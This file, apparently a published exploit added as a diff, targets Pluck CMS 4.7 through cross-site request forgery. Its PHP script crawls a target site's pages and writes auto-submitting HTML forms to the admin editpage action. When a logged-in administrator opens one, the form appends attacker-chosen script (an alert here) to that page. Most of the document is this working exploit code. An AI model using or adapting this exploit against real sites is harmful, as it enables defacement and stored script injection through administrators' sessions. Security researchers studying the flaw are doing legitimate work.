@@ -1,0 +1,82 @@
+###########################################################################################
+# Exploit Title: Pluck CMS CSRF - Injecting malicious contents to pagess
+# Date: 2013 4 August
+# Exploit Author: Yashar shahinzadeh
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://www.pluck-cms.org/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version : 4.7
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir }
+###########################################################################################
+
+Summary:
+========
+1. CSRF - Injecting malicious contents to pagess
+
+
+1. CSRF - Injecting malicious contents to pagess:
+=================================================
+PHP exploit written below can be used to add malicious contents to any page created by CMS. The rexploits results in HTML outputs corresponding CMS pages (main pages). HTML outputs are called CSRF exploit which will edit the page which will include malicious content and old contents of page. Malicious content must be chosen by the attacker. In the case of illustration, I just put the <script>alert(\'123\');</script>. Many devastating usage would be achieved through injecting HTML code to a page.
+
+/// EXPLOIT TESTED ON PHP 5.3.4 ///
+
+<?php
+/** To prevent of time out **/
+set_time_limit(0);
+
+/** Error reporting **/
+error_reporting(0);
+
+/** Initializing **/
+echo '/--------------------------------------------------------------\\',"\n";
+echo '| Exploit by Yashar shahinzadeh',"\n";
+echo '| Credit goes for http://ha.cker.ir & http://y-shahinzadeh.ir ',"\n";
+echo '\--------------------------------------------------------------/',"\n\n";
+
+/** Site **/
+$site = $argv[1];
+
+/** Some information to user **/
+echo '['.date("H:i:s").'] Site: ',$site,"\n";
+echo '['.date("H:i:s").'] Getting pages...',"\n";
+
+/** Sending a HTTP request to fckeditr/ **/
+$contents = file_get_contents($site);
+
+/** pages **/
+preg_match_all("/<a href=\"\?file=.*?\"/is", $contents, $matches);
+
+echo '['.date("H:i:s").'] Creating exploits...',"\n";
+
+foreach($matches[0] as $page)
+{
+	$RPage = substr(strstr($page,'e='),2,-1);
+	
+	$CurrentPageContents = file_get_contents($site.'?file='.$RPage);	
+	preg_match("/<div id=\"content\">.*?<\/div>/is",$CurrentPageContents,$matches);
+	$CurrentPageContents = strip_tags(strstr($matches[0],'</h2>'));
+	
+	$ExploitContent = '<html>
+	<body onload="submitForm()">
+	<form name="myForm" id="myForm"
+	action="'.$site.'admin.php?action=editpage&page='.$RPage.'" method="post">
+	<input type="hidden" name="title" value="'.$RPage.'">
+	<input type="hidden" name="content" value="'.$CurrentPageContents.' <script>alert(\'123\');</script>">
+	<input type="hidden" name="description" value="">
+	<input type="hidden" name="keywords" value="">
+	<input type="hidden" name="hidden" value="no">
+	<input type="hidden" name="sub_page" value="">
+	<input type="hidden" name="theme" value="default">
+	<input type="hidden" name="save" value="Save">
+	</form>
+	<script type=\'text/javascript\'>document.myForm.submit();</script>
+	</html>';
+	
+	/** Creating exploits **/
+	file_put_contents($RPage.'.html',$ExploitContent);
+}
+
+echo '['.date("H:i:s").'] Done!',"\n";
+
+/** Yasshar shahinzadeh **/
